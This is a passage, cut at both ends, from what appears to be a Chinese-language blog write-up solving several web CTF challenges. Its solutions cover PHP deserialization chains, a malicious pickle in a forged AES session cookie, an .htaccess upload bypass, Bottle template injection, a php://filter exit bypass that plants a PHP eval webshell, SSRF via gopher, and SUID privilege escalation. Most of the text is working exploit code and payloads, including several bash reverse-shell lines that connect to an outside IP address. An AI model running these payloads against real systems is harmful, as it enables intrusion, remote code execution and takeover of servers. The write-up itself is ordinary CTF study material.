class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">UselessFour</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$lalala</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Hehe&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;GHCTF&#x27;</span>])) &#123;</span><br><span class="line">    <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;GHCTF&#x27;</span>]);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>php原生类代码执行,危险方法在Mystery里，有很多没用的类<br>exp:</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">CherryBlossom</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$fruit1</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$fruit2</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;fruit1;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">        <span class="variable">$newFunc</span> = <span class="variable language_">$this</span>-&gt;fruit2;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$newFunc</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Warlord</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$fruit4</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$fruit5</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$arg1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$arg1</span>, <span class="variable">$arg2</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">        <span class="variable">$function</span> = <span class="variable language_">$this</span>-&gt;fruit4;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$function</span>();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$arg1</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;fruit5-&gt;<span class="title function_ invoke__">ll2</span>(<span class="string">&#x27;b2&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Samurai</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$fruit6</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$fruit7</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">        <span class="variable">$long</span> = @<span class="variable language_">$this</span>-&gt;fruit6-&gt;<span class="title function_ invoke__">add</span>();</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$long</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__set</span>(<span class="params"><span class="variable">$arg1</span>, <span class="variable">$arg2</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;fruit7-&gt;tt2) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;xxx are the best!!!&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Mystery</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">    <span class="comment"># public $DirectoryIterator=&quot;/&quot;</span></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$SplFileObject</span> = <span class="string">&quot;php://filter/convert.base64-encode/resource=/flag44545615441084&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$arg1</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">array_walk</span>(<span class="variable">$this</span>, function (<span class="variable">$day1</span>, <span class="variable">$day2</span>) &#123;</span><br><span class="line">            <span class="variable">$day3</span> = <span class="keyword">new</span> <span class="variable">$day2</span>(<span class="variable">$day1</span>);</span><br><span class="line">            <span class="keyword">foreach</span> (<span class="variable">$day3</span> <span class="keyword">as</span> <span class="variable">$day4</span>) &#123;</span><br><span class="line">                <span class="keyword">echo</span> (<span class="variable">$day4</span> . <span class="string">&#x27;&lt;br&gt;&#x27;</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Philosopher</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$fruit10</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$fruit11</span> = <span class="string">&quot;0e5985&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$this</span>-&gt;fruit11)) == <span class="number">666</span>) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;success&quot;</span>;</span><br><span class="line">            <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;fruit10-&gt;hey;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Warrior</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$fruit12</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$fruit13</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__set</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$value</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="variable">$name</span> = <span class="variable">$value</span>;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;fruit13 == <span class="string">&quot;xxx&quot;</span>) &#123;</span><br><span class="line">            <span class="title function_ invoke__">strtolower</span>(<span class="variable">$this</span>-&gt;fruit12);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="variable">$C</span> = <span class="keyword">new</span> <span class="title class_">CherryBlossom</span>;</span><br><span class="line"><span class="variable">$P</span> = <span class="keyword">new</span> <span class="title class_">Philosopher</span>;</span><br><span class="line"><span class="variable">$M</span> = <span class="keyword">new</span> <span class="title class_">Mystery</span>;</span><br><span class="line"><span class="variable">$War</span> = <span class="keyword">new</span> <span class="title class_">Warlord</span>;</span><br><span class="line"><span class="variable">$Warr</span> = <span class="keyword">new</span> <span class="title class_">Warrior</span>;</span><br><span class="line"><span class="variable">$S</span> = <span class="keyword">new</span> <span class="title class_">Samurai</span>;</span><br><span class="line"><span class="variable">$C</span>-&gt;fruit1 = <span class="variable">$C</span>;</span><br><span class="line"><span class="variable">$C</span>-&gt;fruit2 = <span class="variable">$P</span>;</span><br><span class="line"><span class="variable">$P</span>-&gt;fruit10 = <span class="variable">$M</span>;</span><br><span class="line"><span class="variable">$p</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$C</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$p</span>;</span><br><span class="line"><span class="title function_ invoke__">unserialize</span>(<span class="variable">$p</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">//　O:13:&quot;CherryBlossom&quot;:2:&#123;s:6:&quot;fruit1&quot;;r:1;s:6:&quot;fruit2&quot;;O:11:&quot;Philosopher&quot;:2:&#123;s:7:&quot;fruit10&quot;;O:7:&quot;Mystery&quot;:1:&#123;s:13:&quot;SplFileObject&quot;;s:63:&quot;php://filter/convert.base64-encode/resource=/flag44545615441084&quot;;&#125;s:7:&quot;fruit11&quot;;s:6:&quot;0e5985&quot;;&#125;&#125;</span></span><br></pre></td></tr></table></figure><h2 id="ezzzz-pickle">ezzzz_pickle</h2><p>第一层弱密码用rockyou字典跑出来为 admin/admin123<br>filename=/app/app.py</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, redirect, make_response,render_template</span><br><span class="line"><span class="keyword">from</span> cryptography.hazmat.primitives.ciphers <span class="keyword">import</span> Cipher, algorithms, modes</span><br><span class="line"><span class="keyword">from</span> cryptography.hazmat.backends <span class="keyword">import</span> default_backend</span><br><span class="line"><span class="keyword">from</span> cryptography.hazmat.primitives <span class="keyword">import</span> padding</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> hmac</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">generate_key_iv</span>():</span><br><span class="line">    key = os.environ.get(<span class="string">&#x27;SECRET_key&#x27;</span>).encode()</span><br><span class="line">    iv = os.environ.get(<span class="string">&#x27;SECRET_iv&#x27;</span>).encode()</span><br><span class="line">    <span class="keyword">return</span> key, iv</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">aes_encrypt_decrypt</span>(<span class="params">data, key, iv, mode=<span class="string">&#x27;encrypt&#x27;</span></span>):</span><br><span class="line"></span><br><span class="line">    cipher = Cipher(algorithms.AES(key), modes.CBC(iv), backend=default_backend())</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> mode == <span class="string">&#x27;encrypt&#x27;</span>:</span><br><span class="line">        encryptor = cipher.encryptor()</span><br><span class="line"></span><br><span class="line">        padder = padding.PKCS7(algorithms.AES.block_size).padder()</span><br><span class="line">        padded_data = padder.update(data.encode()) + padder.finalize()</span><br><span class="line">        result = encryptor.update(padded_data) + encryptor.finalize()</span><br><span class="line">        <span class="keyword">return</span> base64.b64encode(result).decode()  </span><br><span class="line"></span><br><span class="line">    <span class="keyword">elif</span> mode == <span class="string">&#x27;decrypt&#x27;</span>:</span><br><span class="line">        decryptor = cipher.decryptor()</span><br><span class="line"></span><br><span class="line">        encrypted_data_bytes = base64.b64decode(data)</span><br><span class="line">        decrypted_data = decryptor.update(encrypted_data_bytes) + decryptor.finalize()</span><br><span class="line"></span><br><span class="line">        unpadder = padding.PKCS7(algorithms.AES.block_size).unpadder()</span><br><span class="line">        unpadded_data = unpadder.update(decrypted_data) + unpadder.finalize()</span><br><span class="line">        <span class="keyword">return</span> unpadded_data.decode()</span><br><span class="line"></span><br><span class="line">users = &#123;</span><br><span class="line">    <span class="string">&quot;admin&quot;</span>: <span class="string">&quot;admin123&quot;</span>,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">create_session</span>(<span class="params">username</span>):</span><br><span class="line"></span><br><span class="line">    session_data = &#123;</span><br><span class="line">        <span class="string">&quot;username&quot;</span>: username,</span><br><span class="line">        <span class="string">&quot;expires&quot;</span>: time.time() + <span class="number">3600</span>  </span><br><span class="line">    &#125;</span><br><span class="line">    pickled = pickle.dumps(session_data)</span><br><span class="line">    pickled_data = base64.b64encode(pickled).decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    key,iv=generate_key_iv()</span><br><span class="line">    session=aes_encrypt_decrypt(pickled_data, key, iv,mode=<span class="string">&#x27;encrypt&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> session</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dowload_file</span>(<span class="params">filename</span>):</span><br><span class="line">    path=os.path.join(<span class="string">&quot;static&quot;</span>,filename)</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(path, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        data=f.read().decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> data</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">validate_session</span>(<span class="params">cookie</span>):</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        key, iv = generate_key_iv()</span><br><span class="line">        pickled = aes_encrypt_decrypt(cookie, key, iv,mode=<span class="string">&#x27;decrypt&#x27;</span>)</span><br><span class="line">        pickled_data=base64.b64decode(pickled)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        session_data = pickle.loads(pickled_data)</span><br><span class="line">        <span class="keyword">if</span> session_data[<span class="string">&quot;username&quot;</span>] !=<span class="string">&quot;admin&quot;</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> session_data <span class="keyword">if</span> session_data[<span class="string">&quot;expires&quot;</span>] &gt; time.time() <span class="keyword">else</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/&quot;</span>,methods=[<span class="string">&#x27;GET&#x27;</span>,<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;session&quot;</span> <span class="keyword">in</span> request.cookies:</span><br><span class="line">        session = validate_session(request.cookies[<span class="string">&quot;session&quot;</span>])</span><br><span class="line">        <span class="keyword">if</span> session:</span><br><span class="line">            data=<span class="string">&quot;&quot;</span></span><br><span class="line">            filename=request.form.get(<span class="string">&quot;filename&quot;</span>)</span><br><span class="line">            <span class="keyword">if</span>(filename):</span><br><span class="line">                data=dowload_file(filename)</span><br><span class="line">            <span class="keyword">return</span> render_template(<span class="string">&quot;index.html&quot;</span>,name=session[<span class="string">&#x27;username&#x27;</span>],file_data=data)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> redirect(<span class="string">&quot;/login&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/login&quot;</span>, methods=[<span class="string">&quot;GET&quot;</span>, <span class="string">&quot;POST&quot;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">login</span>():</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&quot;POST&quot;</span>:</span><br><span class="line">        username = request.form.get(<span class="string">&quot;username&quot;</span>)</span><br><span class="line">        password = request.form.get(<span class="string">&quot;password&quot;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> users.get(username) == password:</span><br><span class="line">            resp = make_response(redirect(<span class="string">&quot;/&quot;</span>))</span><br><span class="line"></span><br><span class="line">            resp.set_cookie(<span class="string">&quot;session&quot;</span>, create_session(username))</span><br><span class="line">            <span class="keyword">return</span> resp</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&quot;login.html&quot;</span>,error=<span class="string">&quot;Invalid username or password&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&quot;login.html&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/logout&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">logout</span>():</span><br><span class="line">    resp = make_response(redirect(<span class="string">&quot;/login&quot;</span>))</span><br><span class="line">    resp.delete_cookie(<span class="string">&quot;session&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> resp</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run(host=<span class="string">&quot;0.0.0.0&quot;</span>,debug=<span class="literal">False</span>)</span><br></pre></td></tr></table></figure><p>filename=/proc/self/environ读取SECRET_key和SECRET_iv<br><a href="http://exp.py">exp.py</a></p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">from</span> cryptography.hazmat.primitives <span class="keyword">import</span> padding</span><br><span class="line"><span class="keyword">import</span> algorithms</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">A</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__reduce__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> (</span><br><span class="line">            <span class="built_in">eval</span>,</span><br><span class="line">            (</span><br><span class="line">                <span class="string">&quot;__import__(&#x27;os&#x27;).system(&#x27;bash -c \&quot;bash -i &gt;&amp; /dev/tcp/8.155.17.250/1234 0&gt;&amp;1\&quot;&#x27;)&quot;</span>,</span><br><span class="line">            ),</span><br><span class="line">        )</span><br><span class="line">poc = A()</span><br><span class="line">result = pickle.dumps(poc)</span><br><span class="line">result = base64.b64encode(result)</span><br><span class="line"><span class="built_in">print</span>(result)</span><br><span class="line"><span class="comment"># gASVawAAAAAAAACMCGJ1aWx0aW5zlIwEZXZhbJSTlIxPX19pbXBvcnRfXygnb3MnKS5zeXN0ZW0oJ2Jhc2ggLWMgImJhc2ggLWkgPiYgL2Rldi90Y3AvOC4xNTUuMTcuMjUwLzEyMzQgMD4mMSInKZSFlFKULg==</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, redirect, make_response, render_template</span><br><span class="line"><span class="keyword">from</span> cryptography.hazmat.primitives.ciphers <span class="keyword">import</span> Cipher, algorithms, modes</span><br><span class="line"><span class="keyword">from</span> cryptography.hazmat.backends <span class="keyword">import</span> default_backend</span><br><span class="line"><span class="keyword">from</span> cryptography.hazmat.primitives <span class="keyword">import</span> padding</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> hmac</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">aes_encrypt_decrypt</span>(<span class="params">data, key, iv, mode</span>):</span><br><span class="line"></span><br><span class="line">    cipher = Cipher(algorithms.AES(key), modes.CBC(iv), backend=default_backend())</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> mode == <span class="string">&quot;encrypt&quot;</span>:</span><br><span class="line">        encryptor = cipher.encryptor()</span><br><span class="line"></span><br><span class="line">        padder = padding.PKCS7(algorithms.AES.block_size).padder()</span><br><span class="line">        padded_data = padder.update(data.encode()) + padder.finalize()</span><br><span class="line">        result = encryptor.update(padded_data) + encryptor.finalize()</span><br><span class="line">        <span class="built_in">print</span>(base64.b64encode(result).decode())</span><br><span class="line">        <span class="keyword">return</span> base64.b64encode(result).decode()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">elif</span> mode == <span class="string">&quot;decrypt&quot;</span>:</span><br><span class="line">        decryptor = cipher.decryptor()</span><br><span class="line"></span><br><span class="line">        encrypted_data_bytes = base64.b64decode(data)</span><br><span class="line">        decrypted_data = decryptor.update(encrypted_data_bytes) + decryptor.finalize()</span><br><span class="line"></span><br><span class="line">        unpadder = padding.PKCS7(algorithms.AES.block_size).unpadder()</span><br><span class="line">        unpadded_data = unpadder.update(decrypted_data) + unpadder.finalize()</span><br><span class="line">        <span class="built_in">print</span>(unpadded_data.decode())</span><br><span class="line">        <span class="keyword">return</span> unpadded_data.decode()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">key = <span class="string">&quot;ajwdopldwjdowpajdmslkmwjrfhgnbbv&quot;</span>.encode()</span><br><span class="line">iv = <span class="string">&quot;asdwdggiouewhgpw&quot;</span>.encode()</span><br><span class="line"><span class="comment"># session_data = &quot;eJBngHD43jk0xHXrBaNFNQueoE+41rE1GNZawdm3Db3NGUnXuJHIDoTld33vveJtHmC5HWFG5Q3oTI73Un+mFztBp01eKk7x1e4FHOWQKWs=&quot;</span></span><br><span class="line"><span class="comment"># aes_encrypt_decrypt(session_data, key, iv, mode=&quot;decrypt&quot;)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># original_data = &#123;&quot;username&quot;: &quot;admin&quot;, &quot;expires&quot;: 1741065550.4897454&#125;</span></span><br><span class="line"><span class="comment"># pickled = pickle.dumps(original_data)</span></span><br><span class="line"><span class="comment"># pickled_data = base64.b64encode(pickled).decode(&quot;utf-8&quot;)</span></span><br><span class="line"><span class="comment"># aes_encrypt_decrypt(pickled_data, key, iv, mode=&quot;encrypt&quot;)</span></span><br><span class="line"></span><br><span class="line">base64_data = <span class="string">&quot;gASVawAAAAAAAACMCGJ1aWx0aW5zlIwEZXZhbJSTlIxPX19pbXBvcnRfXygnb3MnKS5zeXN0ZW0oJ2Jhc2ggLWMgImJhc2ggLWkgPiYgL2Rldi90Y3AvOC4xNTUuMTcuMjUwLzEyMzQgMD4mMSInKZSFlFKULg==&quot;</span></span><br><span class="line">aes_encrypt_decrypt(base64_data, key, iv, mode=<span class="string">&quot;encrypt&quot;</span>)</span><br><span class="line"><span class="comment"># 9ZTXgZqf+FzZam6mUuGVsXKTKcwZkC67KUXj+8tBxsx2y9AEvrDSWVU/3PHcd/G+LWbN6I/zh73FhQiR4JcpYeVsuiNU540ZSm+MUEbcaIipWAEsS460UhO5VKXtn7hdSjfNa3OzWO9tViwA9W5Z+q3rbmuR7Z/BV3Kh93RXJpbuN34E7sHh5hVmu7xFM0nRoI1ATJKa1HBr9HRidRy0MLsOmTbU/0w+Ch4NFtShm/0=</span></span><br></pre></td></tr></table></figure><p>自行改成自己的VPS地址,不知道为什么用system没法执行，只能用eval了。</p><h2 id="UPUPUP">UPUPUP</h2><p>考察文件头检测。像是奇安信的littledropbox那题<br><a href="https://blog.hatchet.top/posts/89707270">https://blog.hatchet.top/posts/89707270</a><br>我们可以使用 WEBP 格式绕过<br>WBMP 图像的开头可以使用 # 设置图像的尺寸大小，这正符合我们的要求。题目限制我们上传的图片尺寸必须为 100x50，那么我们在上传.htaccess 时便可以用 WBMP 来绕过：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#define width 100</span><br><span class="line">#define height 50</span><br><span class="line">AddType application/x-httpd-php .jpg</span><br></pre></td></tr></table></figure><p>然后在a.jpg里写上一句话木马就好了，秒杀</p><h2 id="Message-in-a-Bottle">Message in a Bottle</h2><p>考察是Bottle的模版渲染问题，为了区分和jinja2的区别过滤了{和}。<br>使用类似情况可以执行python语句</p><pre><code>\n%...#</code></pre><p>payload:</p><pre><code>message=%0D%0A%25__import__('os').system('bash -c &quot;bash -i &gt;&amp; /dev/tcp/8.155.17.250/1234 0&gt;&amp;1&quot;')#</code></pre><h2 id="Escape！">Escape！</h2><p>waf.php</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">waf</span>(<span class="params"><span class="variable">$c</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$lists</span>=[<span class="string">&quot;flag&quot;</span>,<span class="string">&quot;&#x27;&quot;</span>,<span class="string">&quot;\\&quot;</span>,<span class="string">&quot;sleep&quot;</span>,<span class="string">&quot;and&quot;</span>,<span class="string">&quot;||&quot;</span>,<span class="string">&quot;&amp;&amp;&quot;</span>,<span class="string">&quot;select&quot;</span>,<span class="string">&quot;union&quot;</span>];</span><br><span class="line">    <span class="keyword">foreach</span>(<span class="variable">$lists</span> <span class="keyword">as</span> <span class="variable">$list</span>)&#123;</span><br><span class="line">        <span class="variable">$c</span>=<span class="title function_ invoke__">str_replace</span>(<span class="variable">$list</span>,<span class="string">&quot;error&quot;</span>,<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">#echo $c;</span></span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$c</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>反序列化逃逸题</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span> = <span class="string">&#x27;&quot;;s:7:&quot;isadmin&quot;;b:1;&#125;&#x27;</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="title function_ invoke__">strlen</span>(<span class="variable">$a</span>); <span class="variable">$i</span>++) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;flag&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$a</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">strlen</span>(<span class="variable">$a</span>);</span><br></pre></td></tr></table></figure><p>注册个用户名为<code>flagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflag&quot;;s:7:&quot;isadmin&quot;;b:1;&#125;</code>，密码随意的账号<br>反序列化时就会解析成<code>O:4:&quot;User&quot;:2:&#123;s:8:&quot;username&quot;;s:145:&quot;errorerrorerrorerrorerrorerrorerrorerrorerrorerrorerrorerrorerrorerrorerrorerrorerrorerrorerrorerrorerrorerrorerrorerrorerrorerrorerrorerrorerror&quot;;s:1:&quot;1&quot;;s:7:&quot;isadmin&quot;;b:1;&#125;&quot;;s:7:&quot;isadmin&quot;;b:0;&#125;|056d31a5ea46fe88ac28d42041727f050ea6eb7cd55ef6356e51e781defacc35</code>,从而获得admin权限。<br>之后是绕过php的死亡exit，但是一点waf不写，这很新生赛了</p><pre><code>?filename=php://filter/convert.base64-decode/resource=1.php&amp;txt=aPD9waHAgZXZhbCgkX1BPU1RbYV0pOw==</code></pre><p>注意到base64编码前面还加了一个a，那是因为在<?php exit();?>中符合base64编码的只有<code>phpexit</code>7个字符，因此添加一个字符来满足为4的倍数<br>上马后getshell</p><h2 id="GetShell">GetShell</h2><p>考SUID提权，前面写的还挺吓人的，其实就是system($_GET[‘input’]);过滤空格用tab(%09)代替<br>先反弹shell</p><pre><code>action=run&amp;input=bash%09-c%09&quot;bash%09-i%09&gt;%26%09/dev/tcp/8.155.17.250/1234%090&gt;%261&quot;find / -user root -perm -4000 -print 2&gt;/dev/null发现/var/www/html/wc有s读取位/var/www/html/wc --files0-from &quot;/flag&quot;</code></pre><h2 id="Goph3rrr">Goph3rrr</h2><p>藏源码？藏源码？藏源码？藏源码？<br>第一步，把app.py加到扫网站的字典里。<br>然后写个gopher请求，在源码里发现在端口8000开启的服务，打SSRF<br>过滤了127.0.0.1，但其实内网环绕的ip可以随便写。这里用127.0.0.0</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> urllib.parse</span><br><span class="line"></span><br><span class="line">host = <span class="string">&quot;127.0.0.0:8000&quot;</span></span><br><span class="line">content = <span class="string">&quot;cmd=env&quot;</span></span><br><span class="line">content_length = <span class="built_in">len</span>(content)</span><br><span class="line"></span><br><span class="line">test = <span class="string">&quot;&quot;&quot;POST /Manage HTTP/1.1</span></span><br><span class="line"><span class="string">Host: &#123;&#125;</span></span><br><span class="line"><span class="string">Content-Type: application/x-www-form-urlencoded</span></span><br><span class="line"><span class="string">Content-Length: &#123;&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span 